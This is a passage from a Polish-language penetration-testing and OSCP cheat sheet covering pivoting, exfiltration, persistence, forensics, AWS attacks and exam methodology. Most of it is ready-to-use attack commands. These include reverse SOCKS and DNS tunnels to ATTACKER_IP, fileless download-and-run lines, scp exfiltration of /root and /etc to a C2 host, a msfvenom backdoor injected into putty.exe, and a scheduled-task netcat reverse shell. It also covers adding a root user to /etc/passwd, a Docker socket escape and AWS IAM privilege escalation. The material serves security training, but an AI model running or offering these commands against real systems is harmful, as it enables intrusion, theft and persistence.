# U atakującego (server + reverse):
./chisel server -p 8000 --reverse
# Na pivocie (client) — SOCKS proxy przez tunel:
./chisel client ATTACKER_IP:8000 R:socks
# Potem proxychains jak wyżej (domyślnie socks5 127.0.0.1 1080).
# Pojedynczy port zamiast SOCKS:
./chisel client ATTACKER_IP:8000 R:3389:3.3.3.3:3389
```
> Alternatywa premium: **ligolo-ng** (tworzy interfejs tun, nie potrzebujesz proxychains).

## 8.4 Tunneling przez DPI (gdy filtrują ruch)

> Gdy firewall/DPI przepuszcza tylko HTTP(S) albo DNS — opakuj tunel w dozwolony protokół. Wolniejsze, ale przechodzi.

### chisel przez HTTP (SOCKS w WebSocket)
```bash
# Kali (server, reverse):
chisel server --port 8080 --reverse
# Na celu (client) — R:socks tworzy reverse SOCKS5 na 127.0.0.1:1080 u Ciebie:
/tmp/chisel client ATTACKER_IP:8080 R:socks
# Ruch wygląda jak zwykły HTTP/WebSocket (podejrzyj: sudo tcpdump -nvi tun0 tcp port 8080).
# Uwaga na wersję GLIBC na celu — dobierz statyczny/pasujący binarz chisela.
proxychains nmap -sT 172.16.5.0/24    # potem przez socks5 127.0.0.1 1080
```
### DNS tunneling — dnscat2 (gdy wychodzi tylko DNS)
```bash
# Kali = autorytatywny NS dla kontrolowanej domeny (np. feline.corp):
dnscat2-server feline.corp
# Na celu (klient) — bezpośrednio lub przez lokalny resolver:
./dnscat feline.corp
./dnscat --dns server=ATTACKER_IP,port=53 --secret=<SECRET> feline.corp
# W konsoli serwera:  windows → lista sesji ;  window -i 1 → wejdź ;  potem: shell / exec / listen
```
> Setup labowy testowego NS: `sudo dnsmasq -C dnsmasq.conf -d` z `auth-zone=feline.corp`. Alternatywa: **iodine** (interfejs tun po DNS).

### SSH przez łańcuch SOCKS
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215
```

---

# 9. Exfiltration & File Transfer

> Cel fazy: przerzucanie plików w obie strony (payload na cel, dane/loot do siebie).

## 9.1 Serwery po stronie atakującego
```bash
python3 -m http.server 8000                          # prosty HTTP (pobieranie z celu)
python3 -m http.server 8000 --bind $LHOST
impacket-smbserver share ./ -smb2support             # SMB share (świetne dla Windy)
impacket-smbserver share ./ -smb2support -user u -password p   # z uwierzytelnieniem
nc -lvnp 4444 > loot.zip                             # odbiór pliku przez netcat
```

## 9.2 Pobieranie na cel — Linux
```bash
wget http://$LHOST:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST:8000/linpeas.sh -o /tmp/linpeas.sh
curl http://$LHOST:8000/shell.sh | bash              # bez zapisu na dysk
```

## 9.3 Pobieranie na cel — Windows
```powershell
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"   # fileless
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/nc.exe','C:\Users\Public\nc.exe')
Invoke-WebRequest http://ATTACKER:8000/nc.exe -OutFile nc.exe
# certutil (LOLBin — działa też jako download)
certutil -urlcache -split -f "http://ATTACKER:8000/payload.exe" C:\Users\Public\payload.exe
# Z SMB share (impacket-smbserver):
copy \\ATTACKER\share\nc.exe C:\Users\Public\nc.exe
```

## 9.4 Bez uploadu — przez tekst (hex/base64)
Gdy masz tylko shell tekstowy — „wypluj" plik i odtwórz u siebie:
```bash
# Na celu:
xxd -p tajny_plik.zip > data.hex
base64 -w0 tajny_plik.zip                             # alternatywa
# U atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
# base64 -d data.b64 > odzyskany_plik.zip
```
Windows base64:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.kdbx"))   # skopiuj output
# u atakującego: echo '<b64>' | base64 -d > loot.kdbx
certutil -encode plik plik.b64   /   certutil -decode plik.b64 plik   # LOLBin b64
```

## 9.5 Klasyczna eksfiltracja (z modułów)
```bash
tar czf dump.tar.gz /root /etc/                       # archiwizacja
scp dump.tar.gz attacker@c2-server.thm:~              # exfil przez SCP
```

---

# 10. Persistence & Backdooring

### Backdoor w binarce (msfvenom -x — wstrzyknięcie do legalnego .exe)
```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp \
  lhost=$LHOST lport=4444 -b "\x00" -f exe -o puttyX.exe
# -x szablon | -k zachowaj oryginalną funkcję | -b znaki zabronione
```
### Linux — dodanie superusera (patrz §4.1 /etc/passwd)
```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
### Windows — scheduled task / usługa jako persistence (patrz §4.2)
```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\nc.exe -e cmd.exe ATTACKER 4444" /sc onlogon /ru SYSTEM
```

---

# 11. Blue Team / Forensics

> Sekcja obronna/analityczna — detekcja i triage podejrzanych artefaktów.

## 11.1 Wzorce detekcji (co robi atakujący — do korelacji w logach)
```bash
# Faza 1: Discovery spike
whoami; id; pwd; ls -la; crontab -l                   # rozpoznanie
ps aux | egrep "edr|splunk|elastic"                   # szukanie narzędzi security
uname -r                                              # wersja kernela (np. stary 4.4)
# Faza 2: Download do /tmp + kompilacja exploita
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit; chmod +x /tmp/pwnkit; /tmp/pwnkit
# Faza 3: Exfil przez SCP
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

## 11.2 Linux — ausearch (audyt)
```bash
ausearch -i -x socat                                  # podejrzane komendy po nazwie
ausearch -i --pid 27806                               # proces rodzic → drzewo procesów
ausearch -i --ppid 27808 | grep proctitle             # procesy potomne
ausearch -i -f /etc/systemd                           # zmiany plików w katalogu
```

## 11.3 Windows — analiza plików
Hash pliku:
```powershell
Get-FileHash -Algorithm SHA256 .\file.exe
certutil -hashfile filename.exe SHA256
```
Strings / grep:
```powershell
Select-String -Path .\file.txt -Pattern "http"
Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive
findstr /i "password" file.txt
Get-Process | Select-String "sql"                     # procesy z 'sql'
```
Metadane i podpis cyfrowy:
```powershell
Get-Item .\suspicious_file.exe | Select-Object *
Get-AuthenticodeSignature .\installer.exe             # czy podpisany/zaufany
```
Hex / magic bytes:
```powershell
Format-Hex .\file.exe | select -first 5
```
DLL — co ładuje proces:
```cmd
tasklist /m                                           :: wszystkie używane DLL
tasklist /m /fi "IMAGENAME eq notepad.exe"            :: DLL notepada
tasklist /m /fi "modules eq malicious.dll"            :: kto używa danej DLL
```
Certutil dekodowanie/enkodowanie:
```cmd
certutil -decode plik.b64 plik                        :: dekoduj base64
certutil -encode plik plik.b64                        :: enkoduj base64
```
Ukryte bajty wykonywalne w skrypcie:
```bash
xxd suspicious_script.sh | head -n 20
```

---

# 12. Toolbox — Reference

> Narzędzia bazowe i systemowe, przydatne na każdym etapie.

## 12.1 grep (Extended Regex)
```bash
grep -E "Failed|Accepted" /var/log/auth.log           # alternatywa | — udane/nieudane logowania
grep -E "log+"                                        # \+ jeden lub więcej: log, logg, loggg
grep -E "https?"                                      # ? zero lub jeden: http oraz https
grep -E "[0-9]{1,3}"                                  # {n,m} od 1 do 3 cyfr
grep -Eo "\b[a-z]{3}\.[a-z0-9]+\.[a-z]{3}\b"          # \b granica słowa: 3litery.wielo.3litery
grep -A 5 "cos"                                       # 5 linii PO
grep -B 5 "cos"                                       # 5 linii PRZED
grep -C 5 "cos"                                       # 5 linii wokół
grep -rniE "wzorzec" /sciezka                         # -r rekursywnie -n numery -i ignore case
```

## 12.2 awk
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt   # separator [ oraz ], drukuj 2. kolumnę
awk '{print $1}' access.log | sort | uniq -c | sort -rn   # top IP z logu
```

## 12.3 find
```bash
sudo find / -name ".env.local" -type f 2>/dev/null    # po nazwie
find . -iname "*monkey*"                              # -iname = bez wielkości liter
find / -writable -type d 2>/dev/null                  # zapisywalne katalogi (privesc)
find / -perm -u=s -type f 2>/dev/null                 # SUID (privesc)
find / -mmin -10 2>/dev/null                          # pliki zmienione w ostatnich 10 min
```

## 12.4 xxd (hex)
```bash
xxd plik.bin                          # podgląd Offset | Hex | ASCII
xxd -l 16 plik.bin                    # -l 16 = pierwsze 16 bajtów (magic bytes / nagłówek)
xxd -p plik.txt                       # czysty hex (do skryptów)
xxd -c 8 plik.bin                     # -c 8 = 8 bajtów na linię
xxd -r zrzut_hex.txt > plik.bin       # -r reverse: hex → binarka
xxd -i plik.bin                       # eksport jako char[] (shellcode do exploita)
```

## 12.5 netstat (flagi)
```
-a  listening + non-listening    -l  tylko listening    -n  numerycznie (bez DNS)
-t  TCP    -u  UDP    -x  UNIX    -p  PID + nazwa procesu
```

## 12.6 Analiza plików / malware
```bash
olevba <plik.doc>                     # wyciąga makra VBA
vol -f memorydump.raw -h              # Volatility: lista modułów zrzutu RAM
strings -n 8 plik.bin | less          # czytelne stringi
file plik.bin                         # rozpoznanie typu po magic bytes
binwalk -e plik.bin                   # ekstrakcja osadzonych plików
```

## 12.7 hash_extender (length extension attack)
> 🔗 https://github.com/iagox86/hash_extender
> Znając hash końcowy pliku, dołączasz dane bez znajomości sekretu (jeśli podpis = `hash(secret + data)`).
```bash
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html
# --data oryginał | --signature oryginalny hash | --append doklejane dane
# --out-data-format=html format wyjścia | --format md5 zmiana algorytmu (domyślnie SHA256)
```

## 12.8 Docker escape
```bash
ls -la /var/run/docker.sock                           # 1. czy jest socket Dockera
docker                                                # czy mamy klienta (jak nie → ręczne API przez curl)
docker -H unix:///var/run/docker.sock ps              # lista kontenerów hosta
docker -H unix:///var/run/docker.sock images          # dostępne obrazy
# Zamontuj system hosta w kontenerze i wejdź jako root:
docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
# php:8.1-cli = znaleziony obraz | -v /:/mnt/matka montuje root hosta | --rm sprząta ślady
lsblk                                                 # (lub fdisk -l) urządzenia do montowania
capsh --print                                         # capabilities kontenera
```
> Wersje z ręcznym API (bez klienta docker):
> `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`

## 12.9 Skanery podatności / hosting
```bash
sudo systemctl start nessusd.service                  # Nessus → https://127.0.0.1:8834
sudo neo4j start                                       # baza pod BloodHound
```

## 12.10 Git (workflow tej ściągi)
```bash
git status                            # co się zmieniło
git add nazwa_folderu/plik.md         # staging
git commit -m "Opis zmian"            # commit
git push origin main                  # push
git pull origin main                  # pull
```

---

# 13. Cloud — AWS (enumeracja i atak)

> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość. Zawsze w granicach zakresu zaangażowania.

## 13.1 Rozpoznanie bez kluczy (unauthenticated)
```bash
cloud_enum -k firma -k firma-prod                    # publiczne buckety S3 i inne zasoby wg nazwy firmy
aws s3 ls s3://firma-assets-public --no-sign-request # anonimowy listing (gdy public)
aws s3 cp s3://firma-assets-public/README.md ./ --no-sign-request
curl http://firma-assets.s3.amazonaws.com/           # listing przez HTTP gdy bucket public
```
> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>`.

## 13.2 Konfiguracja CLI z pozyskanymi kluczami
```bash
aws configure --profile target                       # wklej AKIA..., secret, region (np. us-east-1)
aws --profile target sts get-caller-identity         # kim jestem (ARN, account id)
aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz
```
## 13.3 Enumeracja uprawnień (IAM) — dokąd mogę pójść
```bash
aws --profile target iam list-users
aws --profile target iam list-groups
aws --profile target iam list-roles
aws --profile target iam list-attached-user-policies --user-name bob
aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles)
aws --profile target iam get-policy-version --policy-arn <ARN> --version-id v1
```
> Szukaj nadmiarowych uprawnień → ścieżki eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `sts:AssumeRole`, `*:*`.

## 13.4 Ruch dalej / eskalacja (przykłady)
```bash
# S3 — pobierz dane z prywatnych bucketów, do których masz dostęp:
aws --profile target s3 ls firma-assets-private
aws --profile target s3 sync s3://firma-assets-private ./loot
# EC2 — cudze AMI / snapshoty (mogą zawierać sekrety):
aws --profile target ec2 describe-images  --owners <acct> --executable-users all
aws --profile target ec2 describe-snapshots --filters "Name=description,Values=*prod*"
# Lambda — wylistuj i wywołaj funkcję:
aws --profile target lambda invoke --function-name <arn> out.json
# IAM privesc (gdy masz PutUserPolicy): dołóż sobie politykę admina:
aws --profile target iam put-user-policy --user-name bob --policy-name pe --policy-document file://admin.json
# Persistencja: nowy klucz dostępu do przejętego usera:
aws --profile target iam create-access-key --user-name bob
```
> Automatyzacja audytu/ataku IAM: **Pacu**, **ScoutSuite**, **enumerate-iam**.

---

# 14. Reporting & Technical Report

> Zaangażowanie kończy się **raportem** — to on ma wartość dla klienta (i punkty na OSCP: dodatkowe 24h na raport). Notuj OD RAZU, nie po fakcie.

## 14.1 Notatki w trakcie
> Zapisuj na bieżąco: komendy, output, screenshoty (z widocznym IP celu + `whoami`), znalezione creds. Narzędzia: **Obsidian**, **CherryTree**, **Sysreptor**, **Joplin**. Screeny trzymaj w jednym folderze per host.
```bash
# Szybki dowód na maszynie (do wklejenia w raport):
hostname; whoami; ip a | grep inet          # Linux
cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
# Windows: type C:\Users\Administrator\Desktop\proof.txt & ipconfig & whoami
```
## 14.2 Struktura raportu (OSCP / komercyjny)
> 1. **Executive Summary** — dla zarządu, bez żargonu: co, jak źle, co dalej.
> 2. **Scope & Methodology** — zakres (IP/domeny), okno czasowe, podejście (PTES/OSSTMM).
> 3. **Findings** — każde znalezisko: opis, **risk/CVSS**, dowód (**PoC** + screeny), **kroki reprodukcji**, **remediation** (konkretna rekomendacja).
> 4. **Attack Narrative / Walkthrough** — chronologiczny łańcuch: enumeracja → exploit → privesc → lateral, krok po kroku. Kluczowe na OSCP — oceniający musi ODTWORZYĆ Twoją drogę.
> 5. **Appendices** — pełne outputy, lista creds, użyte narzędzia.

> ✍️ Zasady: każdy krok reprodukowalny; screeny czytelne (IP + proof widoczne); dla OSCP dołącz `local.txt`/`proof.txt` z każdej maszyny. Brak reprodukowalności = brak punktów, nawet gdy „miałeś” roota.

---

# Appendix A — Skróty klawiszowe shell (readline)

| Akcja | Skrót | Mnemonik |
|-------|-------|----------|
| Przesuń o wyraz do przodu | `Alt + F` | **F**orward |
| Przesuń o wyraz do tyłu | `Alt + B` | **B**ackward |
| Na początek linii | `Ctrl + A` | **A** — pierwsza litera |
| Na koniec linii | `Ctrl + E` | **E**nd |
| Usuń wyraz do tyłu | `Ctrl + W` (lub `Alt + Backspace`) | **W**ord (w lewo) |
| Usuń wyraz do przodu | `Alt + D` | **D**elete (w prawo) |
| Usuń wszystko na lewo | `Ctrl + U` | od kursora do początku |
| Usuń wszystko na prawo | `Ctrl + K` | **K**ill (do końca) |
| Wyczyść ekran | `Ctrl + L` | c**L**ear |
| Szukaj w historii | `Ctrl + R` | **R**everse search |
| Przerwij / wklej ostatni kill | `Ctrl + C` / `Ctrl + Y` | Yank |

---

---

# Appendix B — OSCP Exam Playbook / Metodyka

> Egzamin: **~24h + 24h na raport**. Zwykle 3 maszyny standalone (po 20 pkt) + zestaw AD (40 pkt, łańcuch 3 hostów). **70/100** do zdania.
> Konfiguracja może się zmieniać — sprawdź aktualny Exam Guide OSCP przed podejściem.

## B.1 Zasady, które ratują egzamin
- **AD najpierw albo standalone najpierw?** Jeśli masz AD (40 pkt) — często opłaca się je zrobić w całości (all-or-nothing: 3 hosty łańcuchem). Ale jak utkniesz >2h, przełącz się na standalone i wróć.
- **Rób screenshoty NA BIEŻĄCO** — każdy `whoami`, `hostname`, `ip a` na maszynie + `type proof.txt` / `cat proof.txt`. Bez proofa = 0 punktów, nawet z rootem.
- **Rób notatki NA BIEŻĄCO** (CherryTree / Obsidian / Sublime) — komenda + output. Raport piszesz z notatek, nie z pamięci.
- **Restartuj maszynę** jeśli exploit się „zużył" / usługa padła (panel egzaminacyjny ma revert).
- **Metasploit: limit** — możesz użyć MSF/meterpreter na **JEDNEJ** maszynie standalone. `multi/handler` i msfvenom nie liczą się do limitu. Nie marnuj limitu za wcześnie.
- **Zakazane:** narzędzia automatyzujące eksploitację (sqlmap na exam targets — dozwolone tylko do identyfikacji, nie do exploitacji; commercial tools; automatyczne exploit skanery jak Autorecon jest OK do enumeracji). Sprawdź aktualną listę zakazów!
- **Try harder = try different**. Utknąłeś? → wróć do enumeracji. 90% blokad to pominięty port/plik/parametr.

## B.2 Metodyka na każdą maszynę (pętla)
```
1. FULL nmap (-p- -sV -sC)  +  UDP top-ports. Zapisz każdy port.
2. Dla KAŻDEJ usługi: wersja → searchsploit → default creds → ręczna enumeracja.
3. Web: gobuster/ffuf + ręczne klikanie + view-source + /robots.txt. Każdy input testuj (SQLi/LFI/upload/cmdi).
4. Znalazłeś ślad? Wyeksploatuj → foothold → STABILIZUJ shell (TTY).
5. Post-exploit enum: linpeas/winpeas. Przejrzyj CAŁY output.
6. Privesc → root/SYSTEM → proof.txt + screenshot.
7. Loot: hasła, hashe, klucze SSH → mogą otworzyć następny host (pivoting/AD).
```
```bash
searchsploit <usługa> <wersja>          # szukaj gotowych exploitów lokalnie
searchsploit -m 12345                    # skopiuj exploit do bieżącego katalogu
```

## B.3 Checklist enumeracji per-port (najczęstsze wektory)
| Port | Usługa | Pierwsze kroki |
|------|--------|----------------|
| 21 | FTP | anon login (`ftp $IP` → anonymous), `ls`, wersja → searchsploit |
| 22 | SSH | wersja, klucze z lootu, `-oPubkeyAuthentication` |
| 25 | SMTP | `VRFY user` (enum userów), open relay |
| 53 | DNS | zone transfer `dig axfr` |
| 80/443 | HTTP(S) | gobuster/ffuf, whatweb, source, SSL cert (nazwy!), vhosts |
| 111 | RPCbind | `rpcinfo -p $IP`, NFS |
| 139/445 | SMB | enum4linux-ng, smbclient -N, smbmap, wersja → EternalBlue? |
| 161 | SNMP | snmpwalk, community strings |
| 389/636 | LDAP | ldapsearch anon bind |
| 1433 | MSSQL | impacket-mssqlclient, xp_cmdshell |
| 2049 | NFS | `showmount -e $IP`, mount + no_root_squash privesc |
| 3306 | MySQL | default creds, wersja |
| 3389 | RDP | xfreerdp, BlueKeep? |
| 5985/5986 | WinRM | evil-winrm z creds/hash |
| 6379 | Redis | unauth `redis-cli -h $IP`, webshell/SSH key write |

```bash
showmount -e $IP                         # NFS eksporty — szukaj no_root_squash → privesc
rpcinfo -p $IP                           # co RPC wystawia
smbclient -L //$IP -N                    # SMB anon
```

## B.4 Najczęstsze pułapki (rabbit holes)
- **Pominięty port** — skanuj **-p-**, nie top-1000. UDP też (SNMP/TFTP/SMTP).
- **Nie przeczytany cały linpeas/winpeas** — odpowiedź często jest w środku (żółto-czerwone highlighty).
- **Nie przetestowany każdy input** — parametry GET/POST, nagłówki (User-Agent, X-Forwarded-For, Cookie).
- **Ignorowanie `sudo -l`** i `whoami /priv` — pierwsza rzecz po foothold.
- **Reużycie haseł** — hasło z jednej usługi/hosta próbuj wszędzie (spray).
- **Za wczesne palenie MSF** na maszynie, która ma prosty ręczny exploit.
- **Grzebanie w exploicie zamiast enumeracji** — jak coś nie działa 30 min, wróć do enum.

## B.5 Proof i raport
```bash
# Zbierz dowód na każdej maszynie:
whoami && hostname && ip a          # (Linux) / whoami && hostname && ipconfig  (Windows)
cat proof.txt                       # / type proof.txt
```
- Raport w **Markdown → PDF**, szablon OffSec. Każdy krok: opis + komenda + screenshot + output.
- Musi być **odtwarzalny** — ktoś inny ma powtórzyć atak z Twojego raportu.
- Deadline raportu to twarde 24h po egzaminie. Pisz notatki tak, żeby raport = przeklejka + opis.

## B.6 Arsenał do przećwiczenia PRZED egzaminem
`nmap` • `ffuf`/`gobuster` • `searchsploit` • `linpeas`/`winpeas`/`pspy` • `hydra` •
`impacket-*` (psexec/wmiexec/secretsdump/GetNPUsers/GetUserSPNs) • `evil-winrm` •
`crackmapexec/netexec` • `chisel`/`ligolo-ng` (pivoting!) • `mimikatz`/`Rubeus` •
`BloodHound` • `xfreerdp` • ręczne PtH/PtT/PtK.
> 🔗 Trening: PG Practice (Proving Grounds), HTB (OSCP-like list TJ_Null), TryHackMe (ścieżki AD/Offensive).

---

> **Uwaga o utrzymaniu pliku:** dopisuj nowe komendy do właściwej fazy kill chain, a nie na koniec.
> Gdy komenda pasuje do kilku faz (np. `smbclient` — recon i lateral), trzymaj ją w fazie *pierwszego* użycia i linkuj/wspominaj w drugiej.
